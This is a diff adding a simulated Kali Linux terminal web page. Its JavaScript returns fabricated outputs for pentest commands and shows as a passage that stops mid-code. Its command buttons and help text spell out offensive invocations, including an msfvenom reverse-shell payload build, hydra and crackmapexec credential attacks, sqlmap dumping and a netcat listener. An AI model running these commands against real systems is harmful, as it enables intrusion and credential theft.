@@ -1,0 +1,1260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, interactive-widget=resizes-content">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="Kali Term">
+<meta name="theme-color" content="#0d0d0d">
+<title>Kali Terminal</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+
+  :root {
+    --bg:        #0d0d0d;
+    --term-bg:   #0f0f0f;
+    --bar-bg:    #161616;
+    --border:    #222;
+    --kali-blue: #2fa8e8;
+    --white:     #e2e2e2;
+    --green:     #5af78e;
+    --red:       #ff5c57;
+    --yellow:    #f3f99d;
+    --cyan:      #9aedfe;
+    --magenta:   #ff6ac1;
+    --dim:       #4a4a4a;
+    --key-bg:    #1c1c1c;
+    --key-act:   #2a2a2a;
+    --key-spec:  #193a52;
+    --key-border:#2a2a2a;
+  }
+
+  html, body { height:100%; width:100%; overflow:hidden; background:var(--bg); font-family:'JetBrains Mono',monospace; color:var(--white); }
+
+  /* 100% of the visual viewport so the system keyboard shrinks the layout naturally */
+  #app { display:flex; flex-direction:column; height:100%; width:100%; }
+
+  /* TITLE BAR */
+  #titlebar {
+    flex-shrink:0; background:var(--bar-bg);
+    border-bottom:1px solid var(--border);
+    padding:10px 14px;
+    padding-top: max(10px, env(safe-area-inset-top));
+    display:flex; align-items:center; gap:10px; user-select:none;
+  }
+  .dots { display:flex; gap:6px; }
+  .dot  { width:11px; height:11px; border-radius:50%; }
+  .dot.r{background:#ff5f57;}.dot.y{background:#febc2e;}.dot.g{background:#28c840;}
+  #tb-title { flex:1; text-align:center; font-size:11px; color:#555; letter-spacing:.5px; display:flex; align-items:center; justify-content:center; gap:6px; }
+  #tb-title svg{width:13px;height:13px;}
+  #tb-title span{color:var(--kali-blue);font-weight:700;letter-spacing:1px;}
+  #clear-btn { background:none; border:1px solid #2a2a2a; border-radius:5px; color:#555; font-size:10px; padding:4px 9px; cursor:pointer; font-family:inherit; transition:all .15s; }
+  #clear-btn:active{background:#222;color:#aaa;}
+
+  /* TERMINAL */
+  #terminal {
+    flex:1; overflow-y:auto; overflow-x:hidden;
+    padding:10px 10px 6px; line-height:1.7; font-size:12px;
+    cursor:text; -webkit-overflow-scrolling:touch; overscroll-behavior:contain;
+  }
+  #terminal::-webkit-scrollbar{display:none;}
+
+  .banner { color:var(--kali-blue); white-space:pre; font-size:5.5px; line-height:1.25; margin-bottom:8px; opacity:0; animation:fi .4s ease .1s forwards; }
+  .banner-sub { color:#333; font-size:10px; margin-bottom:14px; opacity:0; animation:fi .4s ease .4s forwards; }
+
+  .out-line { white-space:pre-wrap; word-break:break-all; margin-bottom:1px; animation:fi .12s ease forwards; }
+  .out-line.dim    {color:var(--dim);}
+  .out-line.green  {color:var(--green);}
+  .out-line.red    {color:var(--red);}
+  .out-line.yellow {color:var(--yellow);}
+  .out-line.cyan   {color:var(--cyan);}
+  .out-line.magenta{color:var(--magenta);}
+  .out-line.blue   {color:var(--kali-blue);}
+
+  .p-row{display:flex;flex-wrap:wrap;align-items:baseline;margin-bottom:1px;animation:fi .12s ease forwards;}
+  .pu{color:var(--green);font-weight:700;} .pat{color:var(--white);}
+  .ph{color:var(--kali-blue);font-weight:700;} .ps{color:var(--dim);}
+  .pp{color:var(--cyan);} .psym{color:var(--green);margin:0 5px 0 3px;}
+  .spacer{height:5px;}
+
+  #input-wrap{display:flex;align-items:center;flex-wrap:wrap;padding-bottom:2px;}
+  #cmd-input{background:transparent;border:none;outline:none;color:var(--white);font-family:inherit;font-size:12px;flex:1;min-width:60px;caret-color:var(--green);line-height:1.7;}
+
+  /* SLIM TOOLBAR */
+  #kb-area {
+    flex-shrink:0; background:var(--bar-bg); border-top:1px solid var(--border);
+    padding:5px 6px; padding-bottom:max(5px, env(safe-area-inset-bottom));
+    display:flex; flex-direction:column; gap:4px; user-select:none;
+  }
+
+  /* quick-command scrollable pills */
+  #cmd-pills { display:flex; gap:4px; overflow-x:auto; padding-bottom:2px; scrollbar-width:none; }
+  #cmd-pills::-webkit-scrollbar{display:none;}
+  .pill {
+    flex-shrink:0; background:#193a52; border:1px solid #1a4a6a;
+    border-radius:6px; color:var(--cyan); font-family:inherit; font-size:10px;
+    padding:5px 11px; cursor:pointer; transition:background .1s; white-space:nowrap;
+  }
+  .pill:active{background:#1e5070;}
+
+  /* action row: history nav, tab, enter, ^C */
+  #action-row { display:flex; gap:4px; }
+  .act {
+    flex:1; background:#1c1c1c; border:1px solid #2a2a2a; border-bottom:2px solid #0a0a0a;
+    border-radius:6px; color:#aaa; font-family:inherit; font-size:11px; font-weight:700;
+    padding:8px 4px; cursor:pointer; text-align:center;
+    transition:background .08s, transform .08s;
+    -webkit-user-select:none;
+  }
+  .act:active{background:#2a2a2a; transform:scale(.96);}
+  .act-enter{background:#143a24; color:var(--green); border-color:#1a4a2e; flex:2.5;}
+  .act-enter:active{background:#1c4e30;}
+  .act-ctrl{background:#2a1414; color:var(--red); border-color:#3a1a1a;}
+  .act-ctrl:active{background:#3a1e1e;}
+
+  @keyframes fi{from{opacity:0;transform:translateY(2px);}to{opacity:1;transform:translateY(0);}}
+
+  /* desktop: hide toolbar, bigger font */
+  @media(min-width:768px){
+    #kb-area{display:none;}
+    #terminal{font-size:13px;}
+    .banner{font-size:7.5px;}
+    #cmd-input{font-size:13px;}
+  }
+</style>
+</head>
+<body>
+<div id="app">
+
+  <div id="titlebar">
+    <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+    <div id="tb-title">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" stroke="#2fa8e8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <span>kali@kali — bash</span>
+    </div>
+    <button id="clear-btn" onclick="clearTerm()">CLR</button>
+  </div>
+
+  <div id="terminal" onclick="focusInput()">
+    <div class="banner" id="banner"></div>
+    <div class="banner-sub">Kali Linux 2024.3 — The Art of Exploitation</div>
+    <div id="output"></div>
+    <div id="input-wrap"></div>
+  </div>
+
+  <!-- Slim toolbar: pills + action buttons. System keyboard handles typing. -->
+  <div id="kb-area">
+    <div id="cmd-pills">
+      <button class="pill" onclick="pillCmd('help')">help</button>
+      <button class="pill" onclick="pillCmd('nmap -A 10.10.10.55')">nmap -A</button>
+      <button class="pill" onclick="pillCmd('nmap -sV 10.10.10.55')">nmap -sV</button>
+      <button class="pill" onclick="pillCmd('gobuster dir -u http://10.10.10.55 -w /usr/share/wordlists/dirb/common.txt')">gobuster</button>
+      <button class="pill" onclick="pillCmd('nikto -h 10.10.10.55')">nikto</button>
+      <button class="pill" onclick="pillCmd('dirb http://10.10.10.55')">dirb</button>
+      <button class="pill" onclick="pillCmd('wpscan --url http://10.10.10.55 --enumerate u,p')">wpscan</button>
+      <button class="pill" onclick="pillCmd('sqlmap -u "http://target/page?id=1" --dbs')">sqlmap</button>
+      <button class="pill" onclick="pillCmd('searchsploit apache 2.4')">searchsploit</button>
+      <button class="pill" onclick="pillCmd('msfconsole')">msfconsole</button>
+      <button class="pill" onclick="pillCmd('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.42 LPORT=4444 -f exe -o shell.exe')">msfvenom</button>
+      <button class="pill" onclick="pillCmd('crackmapexec smb 192.168.1.0/24 -u admin -p password123 --shares')">cme</button>
+      <button class="pill" onclick="pillCmd('hydra -l admin -P wordlist.txt 192.168.1.50 ssh')">hydra</button>
+      <button class="pill" onclick="pillCmd('john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt')">john</button>
+      <button class="pill" onclick="pillCmd('hashcat -m 0 -a 0 hashes.txt rockyou.txt')">hashcat</button>
+      <button class="pill" onclick="pillCmd('aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap')">aircrack</button>
+      <button class="pill" onclick="pillCmd('airodump')">airodump</button>
+      <button class="pill" onclick="pillCmd('enum4linux 10.10.10.55')">enum4linux</button>
+      <button class="pill" onclick="pillCmd('linpeas')">linpeas</button>
+      <button class="pill" onclick="pillCmd('nc -l 4444')">nc -l</button>
+      <button class="pill" onclick="pillCmd('ifconfig')">ifconfig</button>
+      <button class="pill" onclick="pillCmd('whoami')">whoami</button>
+      <button class="pill" onclick="pillCmd('cat credentials.txt')">cat creds</button>
+      <button class="pill" onclick="pillCmd('ls')">ls</button>
+      <button class="pill" onclick="pillCmd('curl -v http://target.local')">curl</button>
+      <button class="pill" onclick="pillCmd('curl -I http://target.local')">curl -I</button>
+      <button class="pill" onclick="pillCmd('curl http://target.local/robots.txt')">curl robots</button>
+      <button class="pill" onclick="pillCmd('wget http://target.local/file.php')">wget</button>
+    </div>
+    <div id="action-row">
+      <button class="act" onclick="histUp()">▲</button>
+      <button class="act" onclick="histDown()">▼</button>
+      <button class="act" onclick="doTab()">TAB</button>
+      <button class="act act-enter" onclick="doEnter()">ENTER ↵</button>
+      <button class="act act-ctrl" onclick="doCtrlC()">^C</button>
+    </div>
+  </div>
+
+</div>
+<script>
+/* ── BANNER ── */
+const bannerTxt = `  ██╗  ██╗ █████╗ ██╗     ██╗    ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
+  ██║ ██╔╝██╔══██╗██║     ██║    ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
+  █████╔╝ ███████║██║     ██║    ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
+  ██╔═██╗ ██╔══██║██║     ██║    ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
+  ██║  ██╗██║  ██║███████╗██║    ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
+  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝    ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝`;
+document.getElementById('banner').textContent = bannerTxt;
+
+/* ── STATE ── */
+let cwd       = '~';
+let cmdHist   = [];
+let histIdx   = -1;
+let virtBuf   = '';
+let msfActive = false;
+let msfModule = null;
+let msfOpts   = { RHOSTS:'', LHOST:'192.168.1.42', LPORT:'4444', PAYLOAD:'' };
+
+const termEl   = document.getElementById('terminal');
+const outputEl = document.getElementById('output');
+const wrapEl   = document.getElementById('input-wrap');
+
+/* ── VIRTUAL INPUT ── */
+function getInp() { return document.getElementById('cmd-input'); }
+function focusInput() {
+  const inp = getInp();
+  if (!inp) return;
+  inp.focus();
+  // Force system keyboard on iOS/Android by briefly making it editable
+  inp.readOnly = false;
+  inp.focus();
+  inp.click();
+  setTimeout(() => {
+    inp.focus();
+    inp.setSelectionRange(inp.value.length, inp.value.length);
+    inp.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
+  }, 50);
+}
+function clearTerm()  { outputEl.innerHTML = ''; }
+function scrollBottom(){ setTimeout(()=>{ termEl.scrollTop = termEl.scrollHeight; }, 60); }
+function esc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function typeChar(ch){
+  virtBuf += ch;
+  const inp = getInp();
+  if(inp){ inp.value = virtBuf; inp.focus(); }
+  scrollBottom();
+}
+function doBackspace(){
+  virtBuf = virtBuf.slice(0,-1);
+  const inp = getInp();
+  if(inp){ inp.value = virtBuf; inp.focus(); }
+}
+function doEnter(){ commitCommand(virtBuf.trim()); virtBuf = ''; }
+function doCtrlC(){
+  appendPromptLine(virtBuf+'^C', msfActive);
+  virtBuf = ''; addSpacer();
+  msfActive ? addMsfInput() : addInput();
+  scrollBottom();
+}
+function insertCmd(cmd){
+  virtBuf = cmd;
+  const inp = getInp();
+  if(inp){ inp.value = virtBuf; inp.focus(); inp.setSelectionRange(inp.value.length, inp.value.length); }
+  scrollBottom();
+}
+// Pill tap: insert command text but keep system keyboard open
+function pillCmd(cmd){
+  virtBuf = cmd;
+  const inp = getInp();
+  if(inp){ inp.value = virtBuf; inp.focus(); inp.setSelectionRange(inp.value.length, inp.value.length); }
+  scrollBottom();
+}
+function histUp(){
+  if(histIdx < cmdHist.length-1) histIdx++;
+  virtBuf = cmdHist[cmdHist.length-1-histIdx]||'';
+  const inp=getInp(); if(inp) inp.value=virtBuf;
+}
+function histDown(){
+  if(histIdx>0) histIdx--; else{ histIdx=-1; virtBuf=''; }
+  virtBuf = histIdx>=0?(cmdHist[cmdHist.length-1-histIdx]||''):'';
+  const inp=getInp(); if(inp) inp.value=virtBuf;
+}
+function doTab(){
+  const parts=virtBuf.split(' '), last=parts[parts.length-1];
+  const matches=(fs[cwd]||[]).filter(e=>e.startsWith(last));
+  if(matches.length===1){ parts[parts.length-1]=matches[0]; virtBuf=parts.join(' '); const inp=getInp(); if(inp) inp.value=virtBuf; }
+  else if(matches.length>1) appendLines(matches.map(m=>({t:m,c:'cyan'})));
+}
+
+/* ── DOM HELPERS ── */
+function appendLines(lines){
+  lines.forEach(l=>{
+    if(l===null) return;
+    const d=document.createElement('div');
+    d.className='out-line '+(l.c||'');
+    d.textContent=l.t;
+    outputEl.appendChild(d);
+  });
+  scrollBottom();
+}
+function addSpacer(){ const d=document.createElement('div'); d.className='spacer'; outputEl.appendChild(d); }
+
+function appendPromptLine(cmdText, isMsf){
+  const d=document.createElement('div'); d.className='p-row';
+  if(isMsf){
+    const mn=msfModule?msfModule.split('/').pop():'';
+    d.innerHTML=`<span style="color:#e55">${msfModule?'msf6 exploit':'msf6'}</span>`+
+      (msfModule?`<span style="color:#aaa">(</span><span style="color:var(--yellow)">${mn}</span><span style="color:#aaa">)</span>`:'')+
+      `<span style="color:var(--green)"> &gt; </span><span style="color:var(--white)">${esc(cmdText)}</span>`;
+  } else {
+    d.innerHTML=`<span class="pu">┌──(kali</span><span class="pat">㉿</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">${cwd}</span><span class="ps">]</span><br>`+
+      `<span class="pu">└─</span><span class="psym">#</span><span style="color:var(--white)">${esc(cmdText)}</span>`;
+  }
+  outputEl.appendChild(d);
+}
+
+function makeInput(){
+  const el = document.createElement('input');
+  el.id = 'cmd-input';
+  el.type = 'text';
+  el.setAttribute('autocomplete','off');
+  el.setAttribute('autocorrect','off');
+  el.setAttribute('autocapitalize','none');
+  el.setAttribute('spellcheck','false');
+  el.setAttribute('inputmode','text');
+  el.setAttribute('enterkeyhint','send');
+  el.style.cssText = 'background:transparent;border:none;outline:none;color:var(--white);font-family:inherit;font-size:12px;flex:1;min-width:80px;caret-color:var(--green);line-height:1.7;width:100%;';
+  el.value = virtBuf;
+  el.addEventListener('keydown', handleKey);
+  el.addEventListener('input', e=>{ virtBuf = e.target.value; });
+  return el;
+}
+
+function addInput(){
+  wrapEl.innerHTML = '';
+  const row1 = document.createElement('div');
+  row1.className = 'p-row'; row1.style.width='100%';
+  row1.innerHTML = `<span class="pu">┌──(kali</span><span class="pat">㉿</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">${cwd}</span><span class="ps">]</span>`;
+  const row2 = document.createElement('div');
+  row2.style.cssText = 'display:flex;align-items:center;width:100%;';
+  row2.innerHTML = `<span class="pu">└─</span><span class="psym">#</span>`;
+  row2.appendChild(makeInput());
+  wrapEl.appendChild(row1);
+  wrapEl.appendChild(row2);
+  getInp().focus();
+  scrollBottom();
+}
+
+function addMsfInput(){
+  const mn = msfModule ? msfModule.split('/').pop() : '';
+  wrapEl.innerHTML = '';
+  const row = document.createElement('div');
+  row.style.cssText = 'display:flex;align-items:center;width:100%;flex-wrap:wrap;';
+  row.innerHTML =
+    `<span style="color:#e55">${msfModule?'msf6 exploit':'msf6'}</span>`+
+    (msfModule?`<span style="color:#aaa">(</span><span style="color:var(--yellow)">${mn}</span><span style="color:#aaa">)</span>`:'')+
+    `<span style="color:var(--green)"> &gt; </span>`;
+  row.appendChild(makeInput());
+  wrapEl.appendChild(row);
+  getInp().focus();
+  scrollBottom();
+}
+
+function handleKey(e){
+  if(e.key==='Enter')     { e.preventDefault(); doEnter(); }
+  else if(e.key==='ArrowUp')   { e.preventDefault(); histUp(); }
+  else if(e.key==='ArrowDown') { e.preventDefault(); histDown(); }
+  else if(e.key==='Tab')       { e.preventDefault(); doTab(); }
+  else if(e.ctrlKey&&e.key==='l'){ e.preventDefault(); clearTerm(); }
+  else if(e.ctrlKey&&e.key==='c'){ e.preventDefault(); doCtrlC(); }
+  else virtBuf=e.target.value;
+}
+
+/* ── FILESYSTEM ── */
+const fs = {
+  '~':['Desktop','Documents','Downloads','Music','Pictures','Videos','tools'],
+  '~/Desktop':['target.txt','notes.md'],
+  '~/Documents':['report.pdf','credentials.txt','pentest_notes.txt'],
+  '~/Downloads':['nmap-7.94.tar.gz','exploit.py','wordlist.txt'],
+  '~/tools':['metasploit','burpsuite','sqlmap','hydra'],
+  '~/tools/metasploit':['msfconsole','msfvenom','modules'],
+};
+
+/* ── COMMANDS ── */
+const cmds = {
+  help:()=>[
+    {t:'',c:''},{t:'  ╔════════════════════════════════════════════╗',c:'cyan'},
+    {t:'  ║       Kali Linux — Command Reference       ║',c:'cyan'},
+    {t:'  ╚════════════════════════════════════════════╝',c:'cyan'},{t:'',c:''},
+    {t:'  ── System ──────────────────────────────────',c:'yellow'},
+    {t:'  whoami  id  hostname  uname -a  date',c:''},
+    {t:'  ifconfig  netstat  ps  w  uptime',c:''},
+    {t:'  ls  cd  pwd  cat  echo  clear  history',c:''},{t:'',c:''},
+    {t:'  ── Recon & Scanning ─────────────────────────',c:'yellow'},
+    {t:'  nmap <target> [-sV] [-sC] [-A] [-O]',c:''},
+    {t:'  nikto -h <target> [-p PORT]',c:''},
+    {t:'  enum4linux <target>',c:''},
+    {t:'  searchsploit <term>',c:''},{t:'',c:''},
+    {t:'  ── Web Enumeration & Transfer ──────────────────',c:'yellow'},
+    {t:'  gobuster dir -u URL -w WORDLIST [-x ext]',c:''},
+    {t:'  dirb URL [WORDLIST]',c:''},
+    {t:'  wpscan --url URL [--enumerate u,p,t]',c:''},
+    {t:'  sqlmap -u URL [--dbs][--tables][--dump]',c:''},
+    {t:'  curl URL [-v][-I][-X POST][-d DATA][-H HDR]',c:''},
+    {t:'  wget URL [-O FILE] [-q] [-r]',c:''},{t:'',c:''},
+    {t:'  ── Exploitation ─────────────────────────────',c:'yellow'},
+    {t:'  msfconsole  (use/set/show options/run/back)',c:''},
+    {t:'  msfvenom -p PAYLOAD LHOST=IP LPORT=P -f FMT',c:''},
+    {t:'  crackmapexec smb TARGET -u USER -p PASS',c:''},{t:'',c:''},
+    {t:'  ── Password Attacks ─────────────────────────',c:'yellow'},
+    {t:'  john <file> [--wordlist=FILE] [--format=X]',c:''},
+    {t:'  hashcat -m MODE -a TYPE hashfile wordlist',c:''},
+    {t:'  hydra -l USER -P LIST TARGET SERVICE',c:''},{t:'',c:''},
+    {t:'  ── Wireless ─────────────────────────────────',c:'yellow'},
+    {t:'  aircrack-ng -w WORDLIST -b BSSID cap.cap',c:''},
+    {t:'  airodump  (scan/capture APs & handshakes)',c:''},{t:'',c:''},
+    {t:'  ── Post-Exploitation ────────────────────────',c:'yellow'},
+    {t:'  linpeas    (privesc enumeration)',c:''},
+    {t:'  nc -l PORT  /  nc HOST PORT  (netcat)',c:''},{t:'',c:''},
+  ],
+  whoami:()=>[{t:'root',c:'green'}],
+  id:    ()=>[{t:'uid=0(root) gid=0(root) groups=0(root)',c:''}],
+  hostname:()=>[{t:'kali',c:''}],
+  pwd:   ()=>[{t:cwd.replace('~','/root'),c:''}],
+  date:  ()=>[{t:new Date().toString(),c:''}],
+  uptime:()=>[{t:' '+new Date().toTimeString().slice(0,8)+' up 4:20,  1 user,  load average: 0.42, 0.37, 0.28',c:''}],
+  uname: (a)=>[{t:a.includes('-a')||a.includes('-r')?'Linux kali 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 x86_64 GNU/Linux':'Linux',c:''}],
+
+  ls:(a)=>{
+    const e=fs[cwd]||[]; if(!e.length) return [{t:'',c:''}];
+    const dirs=['Desktop','Documents','Downloads','Music','Pictures','Videos','tools','metasploit','burpsuite','sqlmap','hydra','modules'];
+    return e.map(x=>({t:dirs.includes(x)?x+'/':x, c:dirs.includes(x)?'cyan':x.endsWith('.py')||x.endsWith('.sh')?'green':''}));
+  },
+  cd:(a)=>{
+    const t=a[0];
+    if(!t||t==='~'){cwd='~';return [];}
+    if(t==='..'){const p=cwd.split('/');p.pop();cwd=p.join('/')||'~';return [];}
+    const np=cwd==='~'?`~/${t}`:`${cwd}/${t}`;
+    if(fs[np]){cwd=np;return [];}
+    return [{t:`bash: cd: ${t}: No such file or directory`,c:'red'}];
+  },
+  cat:(a)=>{
+    if(!a[0]) return [{t:'Usage: cat <file>',c:'red'}];
+    const files={
+      'credentials.txt':[{t:'# Captured credentials',c:'yellow'},{t:'admin:password123',c:''},{t:'root:toor',c:''},{t:'user:letmein',c:''}],
+      'pentest_notes.txt':[{t:'=== Pentest Notes ===',c:'cyan'},{t:'Target: 192.168.1.0/24',c:''},{t:'Phase: Reconnaissance',c:''},{t:'Status: In Progress',c:'yellow'}],
+      'notes.md':[{t:'# Notes',c:'cyan'},{t:'- Run nmap on target subnet',c:''},{t:'- Check for open SMB ports',c:''}],
+      'target.txt':[{t:'10.10.10.55',c:''}],
+      'wordlist.txt':[{t:'admin',c:''},{t:'password',c:''},{t:'root',c:''},{t:'123456',c:''},{t:'toor',c:''}],
+    };
+    if(files[a[0]]) return files[a[0]];
+    if((fs[cwd]||[]).includes(a[0])) return [{t:'(binary or empty file)',c:'dim'}];
+    return [{t:`cat: ${a[0]}: No such file or directory`,c:'red'}];
+  },
+  echo:(a)=>[{t:a.join(' '),c:''}],
+  clear:()=>{outputEl.innerHTML='';return[];},
+  history:()=>cmdHist.map((h,i)=>({t:`  ${String(i+1).padStart(3)}  ${h}`,c:''})),
+  ifconfig:()=>[
+    {t:'eth0: flags=4163<UP,BROADCAST,RUNNING>  mtu 1500',c:'yellow'},
+    {t:'        inet 192.168.1.42  netmask 255.255.255.0  broadcast 192.168.1.255',c:''},
+    {t:'        ether 08:00:27:4e:66:a1  txqueuelen 1000',c:''},
+    {t:'        RX packets 12543  bytes 9.3 MiB  TX packets 8921  bytes 1.1 MiB',c:''},{t:'',c:''},
+    {t:'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536',c:'yellow'},
+    {t:'        inet 127.0.0.1  netmask 255.0.0.0',c:''},
+  ],
+  netstat:()=>[
+    {t:'Proto Recv-Q Send-Q Local Address     State',c:'cyan'},
+    {t:'tcp        0      0 0.0.0.0:22        LISTEN',c:''},
+    {t:'tcp        0      0 0.0.0.0:80        LISTEN',c:''},
+    {t:'tcp6       0      0 :::443            LISTEN',c:''},
+  ],
+  ps:()=>[
+    {t:'    PID TTY       TIME CMD',c:'cyan'},
+    {t:'   1234 pts/0 00:00:00 bash',c:''},{t:'   2048 pts/0 00:00:01 python3',c:''},{t:'   4096 pts/0 00:00:00 ps',c:''},
+  ],
+  w:()=>[
+    {t:'USER   TTY   FROM          LOGIN@  WHAT',c:'cyan'},
+    {t:'root   pts/0 192.168.1.10  08:00   bash',c:''},
+  ],
+
+  nmap:(a)=>{
+    const tgt=a.find(x=>!x.startsWith('-'))||'192.168.1.1';
+    const agg=a.includes('-A'), sv=a.includes('-sV')||agg, sc=a.includes('-sC')||agg, os=a.includes('-O')||agg;
+    const r=[
+      {t:`Starting Nmap 7.94 at ${new Date().toLocaleString()}`,c:'dim'},
+      {t:`Nmap scan report for ${tgt}`,c:'yellow'},{t:'Host is up (0.00043s latency).',c:''},{t:'',c:''},
+      {t:'PORT      STATE    SERVICE      VERSION',c:'cyan'},
+      {t:'21/tcp    open     ftp          vsftpd 3.0.3',c:'green'},
+      {t:'22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu',c:'green'},
+      {t:'80/tcp    open     http         Apache httpd 2.4.54',c:'green'},
+      {t:'139/tcp   open     netbios-ssn  Samba smbd 4.6.2',c:'green'},
+      {t:'443/tcp   open     https        Apache httpd 2.4.54',c:'green'},
+      {t:'445/tcp   open     microsoft-ds Samba smbd 4.6.2',c:'green'},
+      {t:'3306/tcp  filtered mysql',c:'yellow'},
+      {t:'8080/tcp  open     http-proxy   Squid 5.7',c:'green'},
+    ];
+    if(sc) r.push({t:'',c:''},{t:'| smb-vuln-ms17-010: VULNERABLE',c:'red'},{t:'|   CVE: CVE-2017-0143   Risk: HIGH',c:'red'});
+    if(os) r.push({t:'',c:''},{t:'OS guess: Linux 5.x (95%), Ubuntu 20.04 (91%)',c:''});
+    r.push({t:'',c:''},{t:`Nmap done: 1 IP (1 host up) scanned in ${(Math.random()*4+1).toFixed(2)}s`,c:'dim'});
+    return r;
+  },
+
+  john:(a)=>{
+    if(!a.length) return [
+      {t:'John the Ripper 1.9.0-jumbo-1',c:'yellow'},
+      {t:'Usage: john <hashfile> [--wordlist=FILE] [--format=TYPE]',c:''},
+      {t:'Formats: md5 sha1 sha256 ntlm bcrypt',c:'dim'},
+    ];
+    const wl=(a.find(x=>x.startsWith('--wordlist='))||'--wordlist=rockyou.txt').split('=')[1];
+    const fmt=(a.find(x=>x.startsWith('--format='))||'--format=MD5').split('=')[1].toUpperCase();
+    return [
+      {t:`Loaded 4 password hashes (${fmt})`,c:''},
+      {t:`Using wordlist: ${wl}`,c:''},{t:'',c:''},
+      {t:'password123      (admin)',c:'green'},
+      {t:'toor             (root)',c:'green'},
+      {t:'letmein          (user)',c:'green'},
+      {t:'abc123           (guest)',c:'green'},{t:'',c:''},
+      {t:`4g 0:00:00:03 DONE — Session completed.`,c:'yellow'},
+    ];
+  },
+
+  hydra:(a)=>{
+    if(!a.length) return [
+      {t:'Hydra v9.4 — Syntax: hydra -l LOGIN -P PASSLIST TARGET SERVICE',c:'yellow'},
+      {t:'Services: ssh ftp smb rdp telnet mysql http-post-form',c:'dim'},
+    ];
+    const li=a.indexOf('-l'); const user=li>=0?a[li+1]:'admin';
+    const pi=a.indexOf('-P'); const pf=pi>=0?a[pi+1]:'wordlist.txt';
+    const tgt=a.find((x,i)=>!x.startsWith('-')&&i!==li+1&&i!==pi+1)||'192.168.1.50';
+    const svc=a[a.length-1]||'ssh';
+    return [
+      {t:`Hydra v9.4 attacking ${svc}://${tgt}`,c:'yellow'},
+      {t:'[DATA] max 16 tasks, attacking with login/password list',c:'dim'},
+      {t:'[STATUS] 2024 tries/min, attack in progress...',c:'dim'},
+      {t:`[22][${svc}] host: ${tgt}   login: ${user}   password: password123`,c:'green'},
+      {t:'1 of 1 target completed, 1 valid password found',c:'green'},
+      {t:`Hydra finished at ${new Date().toLocaleString()}`,c:'dim'},
+    ];
+  },
+
+  sqlmap:(a)=>{
+    if(!a.length) return [
+      {t:' ___ ___[.]_____ ___ ___  {1.7.12#stable}',c:'red'},
+      {t:'|___|_  [.]_|_|_|__,|  _|  https://sqlmap.org',c:'red'},{t:'',c:''},
+      {t:'Usage: sqlmap -u URL [--dbs] [-D db --tables] [--dump]',c:''},
+    ];
+    const ui=a.indexOf('-u'); const url=ui>=0?a[ui+1]:'http://target/page?id=1';
+    const doDbs=a.includes('--dbs'), doTbl=a.includes('--tables'), doDump=a.includes('--dump');
+    const dbi=a.indexOf('-D'); const db=dbi>=0?a[dbi+1]:'webapp';
+    const r=[
+      {t:' ___ ___[.]_____ ___ ___  {1.7.12#stable}',c:'red'},{t:'',c:''},
+      {t:`[*] Testing: ${url}`,c:'dim'},
+      {t:"[+] Parameter 'id' is injectable (MySQL)",c:'green'},
+      {t:'[+] Back-end DBMS: MySQL >= 5.0.12',c:'yellow'},
+    ];
+    if(doDbs) r.push({t:'',c:''},{t:'Available databases:',c:'cyan'},{t:'  [*] information_schema',c:''},{t:'  [*] mysql',c:''},{t:'  [*] webapp',c:'green'});
+    if(doTbl) r.push({t:'',c:''},{t:`Tables in '${db}':`,c:'cyan'},{t:'  | users    |',c:'green'},{t:'  | sessions |',c:''},{t:'  | orders   |',c:''});
+    if(doDump) r.push(
+      {t:'',c:''},{t:'Database: '+db+'  Table: users',c:'cyan'},
+      {t:'+----+----------+----------------------------------+',c:'dim'},
+      {t:'| id | username | password_hash                    |',c:'cyan'},
+      {t:'+----+----------+----------------------------------+',c:'dim'},
+      {t:'|  1 | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |',c:'green'},
+      {t:'|  2 | root     | f28e6d4b62f5f0a0d0b7e4e4a4038e16 |',c:'green'},
+      {t:'+----+----------+----------------------------------+',c:'dim'},
+    );
+    r.push({t:`[*] Done @ ${new Date().toLocaleString()}`,c:'dim'});
+    return r;
+  },
+
+  curl:(a)=>{
+    if(!a.length) return [
+      {t:'curl — transfer data from/to a server',c:'yellow'},
+      {t:'Usage: curl [OPTIONS] URL',c:''},
+      {t:'  -I          HEAD request (headers only)',c:'dim'},
+      {t:'  -i          include response headers',c:'dim'},
+      {t:'  -v          verbose (show request + response)',c:'dim'},
+      {t:'  -X METHOD   HTTP method (GET POST PUT DELETE)',c:'dim'},
+      {t:'  -d DATA     POST data',c:'dim'},
+      {t:'  -H HEADER   add custom header',c:'dim'},
+      {t:'  -u USER:PW  basic auth',c:'dim'},
+      {t:'  -o FILE     write output to file',c:'dim'},
+      {t:'  -s          silent mode',c:'dim'},
+      {t:'  -L          follow redirects',c:'dim'},
+    ];
